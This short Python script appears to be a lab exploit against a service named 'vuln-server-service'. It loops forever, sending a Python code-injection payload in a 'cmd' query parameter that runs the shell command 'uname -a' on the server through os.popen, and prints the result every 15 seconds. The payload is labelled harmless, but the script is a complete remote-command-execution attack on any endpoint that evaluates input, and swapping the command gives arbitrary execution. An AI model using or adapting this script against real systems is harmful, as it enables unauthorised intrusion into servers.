import time
import requests

SERVER = "https://vuln-server-service/run"

# Harmless demonstration payload
payload = "__import__('os').popen('uname -a').read()"

while True:
    try:
        r = requests.get(SERVER, params={"cmd": payload}, verify=True)
        print("Response from exploited server:")
        print(r.text)
    except Exception as e:
        print("Error:", e)

    time.sleep(15)